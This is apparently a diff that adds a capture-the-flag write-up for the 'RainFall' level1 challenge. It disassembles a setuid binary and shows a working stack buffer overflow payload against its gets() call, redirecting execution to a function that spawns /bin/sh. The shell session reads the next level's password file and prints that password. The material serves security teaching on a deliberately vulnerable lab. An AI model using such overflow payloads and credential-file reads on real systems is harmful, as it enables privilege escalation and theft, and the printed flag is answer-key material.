@@ -1,1 +1,105 @@
-(python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && cat) | ./level1
+# Level1
+
+## Hint
+
+Man **gets** :)
+
+## Answer
+
+First of all we have to check what we have:
+```bash
+level1@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+level1@RainFall:~$ ./level1 
+42
+```
+We have a simple program who ask for input and do nothing, interesting
+
+Let make a objdump to see what we have
+```bash
+level1@RainFall:~$ objdump -d level1
+
+level1:     file format elf32-i386
+[...]
+Disassembly of section .plt:
+[...]
+08048340 <gets@plt>:
+ 8048340:       ff 25 98 97 04 08       jmp    *0x8049798
+ 8048346:       68 00 00 00 00          push   $0x0
+ 804834b:       e9 e0 ff ff ff          jmp    8048330 <_init+0x38>      
+[...]
+Disassembly of section .text:
+[...]
+08048444 <run>:
+ 8048444:       55                      push   %ebp
+ 8048445:       89 e5                   mov    %esp,%ebp
+ 8048447:       83 ec 18                sub    $0x18,%esp
+ 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
+ 804844f:       89 c2                   mov    %eax,%edx
+ 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
+ 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
+ 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
+ 8048461:       00 
+ 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
+ 8048469:       00 
+ 804846a:       89 04 24                mov    %eax,(%esp)
+ 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
+ 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
+ 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
+ 804847e:       c9                      leave  
+ 804847f:       c3                      ret    
+
+08048480 <main>:
+ 8048480:       55                      push   %ebp
+ 8048481:       89 e5                   mov    %esp,%ebp
+ 8048483:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048486:       83 ec 50                sub    $0x50,%esp
+ 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
+ 804848d:       89 04 24                mov    %eax,(%esp)
+ 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
+ 8048495:       c9                      leave  
+ 8048496:       c3                      ret    
+ 8048497:       90                      nop
+ 8048498:       90                      nop
+ 8048499:       90                      nop
+ 804849a:       90                      nop
+ 804849b:       90                      nop
+ 804849c:       90                      nop
+ 804849d:       90                      nop
+ 804849e:       90                      nop
+ 804849f:       90                      nop
+[...]
+```
+We have two functions and the **run** make a system function, lets see on gdb what it call:
+```bash
+(gdb) x/s 0x8048584
+0x8048584:       "/bin/sh"
+```
+The system have **/bin/sh** as argument, we have to launch it!
+
+Now when we check at the **main** function, it launch a **gets** and it stop.
+We can see in the man this informations about **gets**:
+```bash
+Bugs
+    Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
+```
+Lets use this vulnerability :D
+
+We have can see in the main function that the stack have a size of $0x50 (80) and that the buffer start with from 0x10 (16): we know that the buffer is 64 size tall. We also know that the gets@plt jump to the right function (gets) and that it have 12 size of instructions.
+
+We know now where to put the adress (64 + 12) to change the return to the right function cause it is next the gets. This technique is call "Stack buffer overflow".
+
+
+```bash
+level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && cat) | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+exit
+
+Segmentation fault (core dumped)
+level1@RainFall:~$
+```
+
+It Segfault cause that the return is removed.
